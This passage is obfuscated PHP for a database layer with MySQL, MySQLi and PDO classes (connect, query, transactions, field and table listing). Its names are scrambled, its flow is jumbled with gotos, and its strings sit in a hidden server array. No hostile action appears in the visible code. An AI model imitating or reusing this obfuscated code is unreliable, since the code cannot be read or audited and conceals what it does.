$this->linkID[$FªÜ‹˜Ò]); } $this->connected = !0; goto Fò¾²±œÓå; Aæ†…¥é†—: if (empty($D«ù…Ëà¢)) { $D«ù…Ëà¢ = $this->config; } $aâ†ÊÃ¯ = $D«ù…Ëà¢[$b°óîÍâÀé[811]] . ($D«ù…Ëà¢[$b°óîÍâÀé[812]] ? "\x3a{$D«ù…Ëà¢[$b°óîÍâÀé[812]]}" : $b°óîÍâÀé[33]); $añ½ğ“÷ç– = !empty($D«ù…Ëà¢[$b°óîÍâÀé[13]][$b°óîÍâÀé[14]]) ? $D«ù…Ëà¢[$b°óîÍâÀé[13]][$b°óîÍâÀé[14]] : $this->pconnect; goto E ÇîÀÖˆÑ; Fò¾²±œÓå: if (1 != think_config($b°óîÍâÀé[18])) { unset($this->config); } goto f›·™ßàÉ; E ÇîÀÖˆÑ: if ($añ½ğ“÷ç–) { $this->linkID[$FªÜ‹˜Ò] = mysql_pconnect($aâ†ÊÃ¯, $D«ù…Ëà¢[$b°óîÍâÀé[813]], $D«ù…Ëà¢[$b°óîÍâÀé[814]], 131072); } else { $this->linkID[$FªÜ‹˜Ò] = mysql_connect($aâ†ÊÃ¯, $D«ù…Ëà¢[$b°óîÍâÀé[813]], $D«ù…Ëà¢[$b°óîÍâÀé[814]], !0, 131072); } if (!$this->linkID[$FªÜ‹˜Ò] || !empty($D«ù…Ëà¢[$b°óîÍâÀé[17]]) && !mysql_select_db($D«ù…Ëà¢[$b°óîÍâÀé[17]], $this->linkID[$FªÜ‹˜Ò])) { think_exception(mysql_error()); } $DÜºñÄßäÒ = mysql_get_server_info($this->linkID[$FªÜ‹˜Ò]); goto Dçïî·ï; f›·™ßàÉ: } return $this->linkID[$FªÜ‹˜Ò]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d³ŞÚ“§–ù) { goto få÷œíé·; DÓ¤İ¦óÎ: if (!$this->_linkID) { return !1; } $this->queryStr = $d³ŞÚ“§–ù; if ($this->queryID) { $this->free(); } goto F¿‰¸…»”; cè¬í©³Ö: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto fç¢ãÙĞŸˆ; få÷œíé·: $Bœ„Äª›ÃÖ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (0 === stripos($d³ŞÚ“§–ù, $Bœ„Äª›ÃÖ[258])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto DÓ¤İ¦óÎ; F¿‰¸…»”: think_action_status($Bœ„Äª›ÃÖ[19], 1); think_status($Bœ„Äª›ÃÖ[20]); $this->queryID = mysql_query($d³ŞÚ“§–ù, $this->_linkID); goto cè¬í©³Ö; fç¢ãÙĞŸˆ: } public function execute($c®´“…˜í›) { goto C·óŠÒÎà; f•ç¨ ¨®†: $this->queryStr = $c®´“…˜í›; if ($this->queryID) { $this->free(); } think_action_status($E°ô¡ŒÈÔœ[21], 1); goto c‘…ùŠö¬›; c‘…ùŠö¬›: think_status($E°ô¡ŒÈÔœ[20]); $D¿îœ‡‚ÊŞ = mysql_query($c®´“…˜í›, $this->_linkID); $this->debug(); goto e Ä¶¯‰; C·óŠÒÎà: $E°ô¡ŒÈÔœ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f•ç¨ ¨®†; e Ä¶¯‰: if (!1 === $D¿îœ‡‚ÊŞ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto AµéæÉ¦©Ø; AµéæÉ¦©Ø: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÈİÅ¿ÈÈ¥×][819], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A‹È¾÷å± = mysql_query($_SERVER[ÈİÅ¿ÈÈ¥×][820], $this->_linkID); $this->transTimes = 0; if (!$A‹È¾÷å±) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e½³èîìÖ = mysql_query($_SERVER[ÈİÅ¿ÈÈ¥×][821], $this->_linkID); $this->transTimes = 0; if (!$e½³èîìÖ) { $this->error(); return !1; } } return !0; } private function getAll() { $E¬‡øœ¢ŒÖ = array(); if ($this->numRows > 0) { while ($E¡Šää¥á = mysql_fetch_assoc($this->queryID)) { $E¬‡øœ¢ŒÖ[] = $E¡Šää¥á; } mysql_data_seek($this->queryID, 0); } return $E¬‡øœ¢ŒÖ; } public function getFields($F¥–ù†„ÖÊ) { $bŒäÅ›Ü¡æ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c±Â½â×‡‚ = $this->query($bŒäÅ›Ü¡æ[822] . $this->parseKey($F¥–ù†„ÖÊ)); $DÆ’›ªÌ = array(); if ($c±Â½â×‡‚) { foreach ($c±Â½â×‡‚ as $Dï±é˜ôÃ¤ => $dÏºÔ‚ï¿½) { $DÆ’›ªÌ[$dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[27]]] = array($bŒäÅ›Ü¡æ[28] => $dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[27]], $bŒäÅ›Ü¡æ[29] => $dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[30]], $bŒäÅ›Ü¡æ[31] => (bool) (strtoupper($dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[32]]) === $bŒäÅ›Ü¡æ[823]), $bŒäÅ›Ü¡æ[34] => $dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[35]], $bŒäÅ›Ü¡æ[36] => strtolower($dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[37]]) == $bŒäÅ›Ü¡æ[38], $bŒäÅ›Ü¡æ[39] => strtolower($dÏºÔ‚ï¿½[$bŒäÅ›Ü¡æ[40]]) == $bŒäÅ›Ü¡æ[41]); } } return $DÆ’›ªÌ; } public function getTables($E£è¡ÊÃŠ‘ = '') { $dÕ£ÔÁ»‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($E£è¡ÊÃŠ‘)) { $c¹”Úğè = $dÕ£ÔÁ»‘[824] . $E£è¡ÊÃŠ‘ . $dÕ£ÔÁ»‘[825]; } else { $c¹”Úğè = $dÕ£ÔÁ»‘[826]; } $cÔÃ»ö‹‘« = $this->query($c¹”Úğè); $bÉÃéŠí½ = array(); foreach ($cÔÃ»ö‹‘« as $aß·áÄÄÊµ => $E®‹Æš˜„) { $bÉÃéŠí½[$aß·áÄÄÊµ] = current($E®‹Æš˜„); } return $bÉÃéŠí½; } public function replace($f‰¹–Ê¨Ä±, $C³®áÀ¶Ü“ = array()) { $fáõô¹ÊÅÌ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($f‰¹–Ê¨Ä± as $aù‡ŒÀŒ¸ => $FïÒì¿˜É©) { $Dª‡ÕÚáËÅ = $this->parseValue($FïÒì¿˜É©); if (is_scalar($Dª‡ÕÚáËÅ)) { $AÏùÀ×ÀÉ¨[] = $Dª‡ÕÚáËÅ; $C¥…·°Ëæš[] = $this->parseKey($aù‡ŒÀŒ¸); } } $E˜Ûğİ™Õ˜ = $fáõô¹ÊÅÌ[827] . $this->parseTable($C³®áÀ¶Ü“[$fáõô¹ÊÅÌ[273]]) . $fáõô¹ÊÅÌ[828] . implode($fáõô¹ÊÅÌ[47], $C¥…·°Ëæš) . $fáõô¹ÊÅÌ[829] . implode($fáõô¹ÊÅÌ[47], $AÏùÀ×ÀÉ¨) . $fáõô¹ÊÅÌ[830]; return $this->execute($E˜Ûğİ™Õ˜); } public function insertAll($fØÀ›Õ‰ùİ, $f¥‘†Ç°»Å = array(), $A›ß“ğ…‘ = false) { goto e™Ñ’©—áº; F¿öÙçÛ®: $dëµ°Ìö = array(); foreach ($fØÀ›Õ‰ùİ as $E¡™öœĞë) { $Fì…„ë¯ Ï = array(); foreach ($E¡™öœĞë as $f™«‡›Æİ˜ => $D—óïË¾²¨) { $D—óïË¾²¨ = $this->parseValue($D—óïË¾²¨); if (is_scalar($D—óïË¾²¨)) { $Fì…„ë¯ Ï[] = $D—óïË¾²¨; } } $dëµ°Ìö[] = $C“¬”Ê¸«[254] . implode($C“¬”Ê¸«[47], $Fì…„ë¯ Ï) . $C“¬”Ê¸«[830]; } array_walk($D†¾æ”Ğ›‰, array($this, $C“¬”Ê¸«[831])); goto f—µÛŠ‘Ä; e™Ñ’©—áº: $C“¬”Ê¸« =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!is_array($fØÀ›Õ‰ùİ[0])) { return !1; } $D†¾æ”Ğ›‰ = array_keys($fØÀ›Õ‰ùİ[0]); goto F¿öÙçÛ®; f—µÛŠ‘Ä: $DÛŠ¬éÚŸ = ($A›ß“ğ…‘ ? $C“¬”Ê¸«[832] : $C“¬”Ê¸«[833]) . $C“¬”Ê¸«[834] . $this->parseTable($f¥‘†Ç°»Å[$C“¬”Ê¸«[273]]) . $C“¬”Ê¸«[828] . implode($C“¬”Ê¸«[47], $D†¾æ”Ğ›‰) . $C“¬”Ê¸«[835] . implode($C“¬”Ê¸«[47], $dëµ°Ìö); return $this->execute($DÛŠ¬éÚŸ); goto B’İÖ„÷Ó½; B’İÖ„÷Ó½: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $A¾‹¶¼¬•º =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->error = mysql_errno() . $A¾‹¶¼¬•º[4] . mysql_error($this->_linkID); if ($A¾‹¶¼¬•º[33] != $this->queryStr) { $this->error .= LNG($A¾‹¶¼¬•º[45]) . $this->queryStr; } think_trace($this->error, $A¾‹¶¼¬•º[33], $A¾‹¶¼¬•º[46]); return $this->error; } public function escapeString($BøøğÍÌ—Ø) { if ($this->_linkID) { return mysql_real_escape_string($BøøğÍÌ—Ø, $this->_linkID); } else { return mysql_escape_string($BøøğÍÌ—Ø); } } public function parseKey(&$DÔÎÖƒĞÀ¬, $DŠæ©÷± = true) { $e¸²¶±İÍİ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($DŠæ©÷±) { $DÔÎÖƒĞÀ¬ = $this->parseKeyCheck($DÔÎÖƒĞÀ¬); } if ($DÔÎÖƒĞÀ¬ != $e¸²¶±İÍİ[180] && !preg_match($e¸²¶±İÍİ[836], $DÔÎÖƒĞÀ¬)) { $DÔÎÖƒĞÀ¬ = $e¸²¶±İÍİ[375] . trim($DÔÎÖƒĞÀ¬, $e¸²¶±İÍİ[375]) . $e¸²¶±İÍİ[375]; } return $DÔÎÖƒĞÀ¬; } } class DbMysqli extends Db { public function __construct($FĞ†ñí²‚è = '') { $Dù‡ôÑï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!extension_loaded($Dù‡ôÑï[734])) { think_exception(think_lang($Dù‡ôÑï[10]) . $Dù‡ôÑï[837]); } if (!empty($FĞ†ñí²‚è)) { $this->config = $FĞ†ñí²‚è; if (empty($this->config[$Dù‡ôÑï[13]])) { $this->config[$Dù‡ôÑï[13]] = $Dù‡ôÑï[33]; } } } public function connect($cÉò·äÕ‡» = '', $E­èªº‹ = 0) { $d¾¸¦ÜãØì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->linkID[$E­èªº‹])) { goto e¤ïÂ×Ëç¤; F—•ÑƒÀ©ˆ: $bÈÄ—†…×Æ = $this->linkID[$E­èªº‹]->server_version; $this->linkID[$E­èªº‹]->query($d¾¸¦ÜãØì[815] . think_config($d¾¸¦ÜãØì[816]) . $d¾¸¦ÜãØì[55]); if ($bÈÄ—†…×Æ > $d¾¸¦ÜãØì[817]) { $this->linkID[$E­èªº‹]->query($d¾¸¦ÜãØì[818]); } goto D’½ò¯ˆî; D’½ò¯ˆî: $this->connected = !0; if (1 != think_config($d¾¸¦ÜãØì[18])) { unset($this->config); } goto Cğé¥ªñµó; e¤ïÂ×Ëç¤: if (empty($cÉò·äÕ‡»)) { $cÉò·äÕ‡» = $this->config; } $this->linkID[$E­èªº‹] = new mysqli($cÉò·äÕ‡»[$d¾¸¦ÜãØì[811]], $cÉò·äÕ‡»[$d¾¸¦ÜãØì[813]], $cÉò·äÕ‡»[$d¾¸¦ÜãØì[814]], $cÉò·äÕ‡»[$d¾¸¦ÜãØì[17]], $cÉò·äÕ‡»[$d¾¸¦ÜãØì[812]] ? intval($cÉò·äÕ‡»[$d¾¸¦ÜãØì[812]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto F—•ÑƒÀ©ˆ; Cğé¥ªñµó: } return $this->linkID[$E­èªº‹]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($DÚ˜„çÓò ) { goto DÕ©™É­éŸ; EÜŸôÓàÒî: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto DéÄÖŒ”ù•; DÕ©™É­éŸ: $dÁÚëËÜÑ§ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dÂ­¿ôä; dÂ­¿ôä: $this->queryStr = $DÚ˜„çÓò ; if ($this->queryID) { $this->free(); } think_action_status($dÁÚëËÜÑ§[19], 1); goto Fˆ¦µ±Â‹‘; Fˆ¦µ±Â‹‘: think_status($dÁÚëËÜÑ§[20]); $this->queryID = $this->_linkID->query($DÚ˜„çÓò ); if ($this->_linkID->more_results()) { while (($C˜Öë°‚è = $this->_linkID->next_result()) != NULL) { $C˜Öë°‚è->free_result(); } } goto EÜŸôÓàÒî; DéÄÖŒ”ù•: } public function execute($DŸÍ£Ú¸†) { goto c÷Ù›Å×; e©Ç³Ïôçé: if (!1 === $b÷¿—“çÉ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto E¬ƒÖõ¦Ü; E±Û°¤ÌÖå: think_status($c·ÈÛô£¨â[20]); $b÷¿—“çÉ = $this->_linkID->query($DŸÍ£Ú¸†); $this->debug(); goto e©Ç³Ïôçé; c÷Ù›Å×: $c·ÈÛô£¨â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DŒ°¿·ÅöÁ; DŒ°¿·ÅöÁ: $this->queryStr = $DŸÍ£Ú¸†; if ($this->queryID) { $this->free(); } think_action_status($c·ÈÛô£¨â[21], 1); goto E±Û°¤ÌÖå; E¬ƒÖõ¦Ü: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AğÜÒÈÊµ‹ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$AğÜÒÈÊµ‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dí˜ÆŸÓÂ‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Dí˜ÆŸÓÂ‡) { $this->error(); return !1; } } return !0; } private function getAll() { $Bï§â¹–éÒ = array(); if ($this->numRows > 0) { for ($CËŠÁÏŞé° = 0; $CËŠÁÏŞé° < $this->numRows; $CËŠÁÏŞé°++) { $Bï§â¹–éÒ[$CËŠÁÏŞé°] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Bï§â¹–éÒ; } public function getFields($a§È…ğÂ±Ü) { $dÃäªïƒï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cˆ¸¨‘È‚Õ = $this->query($dÃäªïƒï[822] . $this->parseKey($a§È…ğÂ±Ü)); $bšÍ†øªÇ = array(); if ($Cˆ¸¨‘È‚Õ) { foreach ($Cˆ¸¨‘È‚Õ as $eÈåê¥Êø => $FÃ„ç¿Á¡è) { $bšÍ†øªÇ[$FÃ„ç¿Á¡è[$dÃäªïƒï[27]]] = array($dÃäªïƒï[28] => $FÃ„ç¿Á¡è[$dÃäªïƒï[27]], $dÃäªïƒï[29] => $FÃ„ç¿Á¡è[$dÃäªïƒï[30]], $dÃäªïƒï[31] => (bool) ($FÃ„ç¿Á¡è[$dÃäªïƒï[32]] === $dÃäªïƒï[33]), $dÃäªïƒï[34] => $FÃ„ç¿Á¡è[$dÃäªïƒï[35]], $dÃäªïƒï[36] => strtolower($FÃ„ç¿Á¡è[$dÃäªïƒï[37]]) == $dÃäªïƒï[38], $dÃäªïƒï[39] => strtolower($FÃ„ç¿Á¡è[$dÃäªïƒï[40]]) == $dÃäªïƒï[41]); } } return $bšÍ†øªÇ; } public function getTables($A„õˆÔ£Ã¬ = '') { $cÛõ™¨ºó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¨­ÉŒÎ˜ = !empty($A„õˆÔ£Ã¬) ? $cÛõ™¨ºó[824] . $A„õˆÔ£Ã¬ . $cÛõ™¨ºó[825] : $cÛõ™¨ºó[826]; $Aæ¨²ÁÂŒÏ = $this->query($A¨­ÉŒÎ˜); $eÎÂ¾¾óŒ‰ = array(); if ($Aæ¨²ÁÂŒÏ) { foreach ($Aæ¨²ÁÂŒÏ as $eˆòß·ùÊ§ => $Eˆ’Ì¯Ãğ) { $eÎÂ¾¾óŒ‰[$eˆòß·ùÊ§] = current($Eˆ’Ì¯Ãğ); } } return $eÎÂ¾¾óŒ‰; } public function replace($c”‘±Í¥Ãß, $B‚‚îï¨ = array()) { $Eâ†ÍÅÃæ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($c”‘±Í¥Ãß as $B¤Í‹³‡ŞÙ => $FÄğÜ´ÔùĞ) { $FÌ¿Šå¤ï¨ = $this->parseValue($FÄğÜ´ÔùĞ); if (is_scalar($FÌ¿Šå¤ï¨)) { $fù¹ÊİÏ÷[] = $FÌ¿Šå¤ï¨; $a×š»Ÿ¯¥[] = $this->parseKey($B¤Í‹³‡ŞÙ); } } $EÌàÅóå = $Eâ†ÍÅÃæ[827] . $this->parseTable($B‚‚îï¨[$Eâ†ÍÅÃæ[273]]) . $Eâ†ÍÅÃæ[828] . implode($Eâ†ÍÅÃæ[47], $a×š»Ÿ¯¥) . $Eâ†ÍÅÃæ[829] . implode($Eâ†ÍÅÃæ[47], $fù¹ÊİÏ÷) . $Eâ†ÍÅÃæ[830]; return $this->execute($EÌàÅóå); } public function insertAll($eğÖïÜœè, $a«–‚ïù–´ = array(), $aÔÏã›œç = false) { goto AÃ¡£¤Û‘À; a‹ò‚õÓ³¼: $E°ƒ³ìÊ¸ã = array(); foreach ($eğÖïÜœè as $dŒ©•æÁêƒ) { $bŸß…ë„˜Ô = array(); foreach ($dŒ©•æÁêƒ as $a¦¹ªÌ» => $eˆ±ä„Ñ ) { $eˆ±ä„Ñ  = $this->parseValue($eˆ±ä„Ñ ); if (is_scalar($eˆ±ä„Ñ )) { $bŸß…ë„˜Ô[] = $eˆ±ä„Ñ ; } } $E°ƒ³ìÊ¸ã[] = $e¼ï‡Üª“ì[254] . implode($e¼ï‡Üª“ì[47], $bŸß…ë„˜Ô) . $e¼ï‡Üª“ì[830]; } array_walk($dãĞÅ©¼è¾, array($this, $e¼ï‡Üª“ì[831])); goto dòµ§œ¤†; dòµ§œ¤†: $dÄ¥ö¼§…– = ($aÔÏã›œç ? $e¼ï‡Üª“ì[832] : $e¼ï‡Üª“ì[833]) . $e¼ï‡Üª“ì[834] . $this->parseTable($a«–‚ïù–´[$e¼ï‡Üª“ì[273]]) . $e¼ï‡Üª“ì[828] . implode($e¼ï‡Üª“ì[47], $dãĞÅ©¼è¾) . $e¼ï‡Üª“ì[835] . implode($e¼ï‡Üª“ì[47], $E°ƒ³ìÊ¸ã); return $this->execute($dÄ¥ö¼§…–); goto Aª“Ì«ç; AÃ¡£¤Û‘À: $e¼ï‡Üª“ì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!is_array($eğÖïÜœè[0])) { return !1; } $dãĞÅ©¼è¾ = array_keys($eğÖïÜœè[0]); goto a‹ò‚õÓ³¼; Aª“Ì«ç: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DßãÇôä‹‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->error = $this->_linkID->errno . $DßãÇôä‹‘[4] . $this->_linkID->error; if ($DßãÇôä‹‘[33] != $this->queryStr) { $this->error .= LNG($DßãÇôä‹‘[45]) . $this->queryStr; } think_trace($this->error, $DßãÇôä‹‘[33], $DßãÇôä‹‘[46]); return $this->error; } public function escapeString($Cè‹¤‚Şµğ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Cè‹¤‚Şµğ); } else { return addslashes($Cè‹¤‚Şµğ); } } public function parseKey(&$Bï·»ŠÂÎ•, $båò“ª = true) { $e¦‡Ãô­¡» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($båò“ª) { $Bï·»ŠÂÎ• = $this->parseKeyCheck($Bï·»ŠÂÎ•); } if ($Bï·»ŠÂÎ• != $e¦‡Ãô­¡»[180] && !preg_match($e¦‡Ãô­¡»[836], $Bï·»ŠÂÎ•)) { $Bï·»ŠÂÎ• = $e¦‡Ãô­¡»[375] . trim($Bï·»ŠÂÎ•, $e¦‡Ãô­¡»[375]) . $e¦‡Ãô­¡»[375]; } return $Bï·»ŠÂÎ•; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($fÑÇä¾·œö = '') { $D‚Àºõô¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!class_exists($D‚Àºõô¤[838])) { think_exception(think_lang($D‚Àºõô¤[10]) . $D‚Àºõô¤[839]); } if (!empty($fÑÇä¾·œö)) { $this->config = $fÑÇä¾·œö; if (empty($this->config[$D‚Àºõô¤[13]])) { $this->config[$D‚Àºõô¤[13]] = array(); } } } public function connect($eÑ¤…äøÓ¾ = '', $Döƒ°šíÉ = 0) { $A‚¨¡è¼Çß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->linkID[$Döƒ°šíÉ])) { goto aÜ‹’Î¦Ó; AÜÅ‘ñÜ»Ş: if (1 != think_config($A‚¨¡è¼Çß[18])) { unset($this->config); } goto cÌİ×íœ¸; aÜ‹’Î¦Ó: if (empty($eÑ¤…äøÓ¾)) { $eÑ¤…äøÓ¾ = $this->config; } $c¦Ò¸¸áÒ = !empty($eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[13]][$A‚¨¡è¼Çß[14]]) ? $eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[13]][$A‚¨¡è¼Çß[14]] : $this->pconnect; if ($c¦Ò¸¸áÒ) { $eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[13]][PDO::ATTR_PERSISTENT] = !0; } goto d‚ŒÑ¨Ä¢; AñÈ£ÎÀÉ†: if (!$this->linkID[$Döƒ°šíÉ]) { think_exception($A‚¨¡è¼Çß[848]); } try { $this->linkID[$Döƒ°šíÉ]->exec($A‚¨¡è¼Çß[849] . think_config($A‚¨¡è¼Çß[816])); } catch (Exception $AÎó«àƒ…Ï) { } $this->connected = !0; goto AÜÅ‘ñÜ»Ş; d‚ŒÑ¨Ä¢: try { $this->linkID[$Döƒ°šíÉ] = new PDO($eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[840]], $eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[813]], $eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[814]], $eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[13]]); } catch (PDOException $AÎó«àƒ…Ï) { think_exception($AÎó«àƒ…Ï->getMessage()); } $this->dbType = $this->_getDsnType($eÑ¤…äøÓ¾[$A‚¨¡è¼Çß[840]]); if (in_array($this->dbType, array($A‚¨¡è¼Çß[841], $A‚¨¡è¼Çß[842], $A‚¨¡è¼Çß[843], $A‚¨¡è¼Çß[844]))) { think_exception($A‚¨¡è¼Çß[845] . $this->dbType . $A‚¨¡è¼Çß[846] . $this->dbType . $A‚¨¡è¼Çß[847]); } goto AñÈ£ÎÀÉ†; cÌİ×íœ¸: } return $this->linkID[$Döƒ°šíÉ]; } public function free() { $this->PDOStatement = null; } public function query($FÄŞë“†½, $D©óª¬Ú£² = array()) { goto FÄ¨´¿ ä; AœÓØ –ŠŒ: if (!1 === $bÅö×³¦) { $this->error(); return !1; } else { return $this->getAll(); } goto f¿Ç´¥¨”; E¸†–ùº¾§: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bÅö×³¦ = $this->PDOStatement->execute($D©óª¬Ú£²); $this->debug(); goto AœÓØ –ŠŒ; EÖÒï¹¸Ò: $this->queryStr = $FÄŞë“†½; if (!empty($D©óª¬Ú£²)) { $this->queryStr .= $B°‡…öÔò’[850] . print_r($D©óª¬Ú£², !0) . $B°‡…öÔò’[851]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cÈ¶ê’éë; cÈ¶ê’éë: think_action_status($B°‡…öÔò’[19], 1); think_status($B°‡…öÔò’[20]); $this->PDOStatement = $this->_linkID->prepare($FÄŞë“†½); goto E¸†–ùº¾§; FÄ¨´¿ ä: $B°‡…öÔò’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÖÒï¹¸Ò; f¿Ç´¥¨”: } public function execute($d–ŸÙ¸Šáğ, $F¹¤ºŒíŠÏ = array()) { goto E†«ëØÆì; BÛ¢«¾ÏŸ‚: $eÓ­êãŸƒì = $this->PDOStatement->execute($F¹¤ºŒíŠÏ); $this->debug(); if (!1 === $eÓ­êãŸƒì) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c¦ÕÏğĞ¨ª || preg_match($eÍÌ…¨¤Àó[856], $d–ŸÙ¸Šáğ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto BÓËá‰¶š«; A¸Çù¢êàÈ: $this->queryStr = $d–ŸÙ¸Šáğ; if (!empty($F¹¤ºŒíŠÏ)) { $this->queryStr .= $eÍÌ…¨¤Àó[850] . print_r($F¹¤ºŒíŠÏ, !0) . $eÍÌ…¨¤Àó[851]; } $c¦ÕÏğĞ¨ª = !1; goto fÑ×â„İÙ; E†«ëØÆì: $eÍÌ…¨¤Àó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A¸Çù¢êàÈ; fÑ×â„İÙ: if ($this->dbType == $eÍÌ…¨¤Àó[844]) { if (preg_match($eÍÌ…¨¤Àó[852], $this->queryStr, $bÙÑ§¦ºß)) { $this->table = think_config($eÍÌ…¨¤Àó[853]) . str_ireplace(think_config($eÍÌ…¨¤Àó[854]), $eÍÌ…¨¤Àó[368], $bÙÑ§¦ºß[2]); $c¦ÕÏğĞ¨ª = (bool) $this->query($eÍÌ…¨¤Àó[855] . strtoupper($this->table) . $eÍÌ…¨¤Àó[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($eÍÌ…¨¤Àó[21], 1); goto A»Å†³ ßš; A»Å†³ ßš: think_status($eÍÌ…¨¤Àó[20]); $this->PDOStatement = $this->_linkID->prepare($d–ŸÙ¸Šáğ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto BÛ¢«¾ÏŸ‚; BÓËá‰¶š«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bƒ”‡àš¶Š = $this->_linkID->commit(); $this->transTimes = 0; if (!$bƒ”‡àš¶Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¤¶§Üç‰ç = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A¤¶§Üç‰ç) { $this->error(); return !1; } } return !0; } private function getAll() { $d¸º‡»ÛÊ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($d¸º‡»ÛÊ); return $d¸º‡»ÛÊ; } public function getFields($A¾Ì…„ÒÒ¹) { goto dÒ¦ òğ‡ã; Dè›ì‚Âºë: $B„Ú“›³§¿ = $this->query($fÄ¢Õé›§ó); $D‹ôÈ®¯öì = array(); if ($B„Ú“›³§¿) { foreach ($B„Ú“›³§¿ as $D¡²ÄËĞ©Ø => $FŞ´Ù¤¯ùŠ) { $FŞ´Ù¤¯ùŠ = array_change_key_case($FŞ´Ù¤¯ùŠ); $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[28]] = isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[28]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[28]] : $fÔÆ¤– ‰Å[368]; $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[29]] = isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[29]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[29]] : $fÔÆ¤– ‰Å[368]; $e ŒÆõ§Èæ = isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[267]]) ? $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[267]] : $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[28]]; $D‹ôÈ®¯öì[$e ŒÆõ§Èæ] = array($fÔÆ¤– ‰Å[28] => $e ŒÆõ§Èæ, $fÔÆ¤– ‰Å[29] => $FŞ´Ù¤¯ùŠ[$fÔÆ¤– ‰Å[29]], $fÔÆ¤– ‰Å[31] => (bool) (isset($FŞ´Ù¤¯ùŠ[$fÔÆ¤– 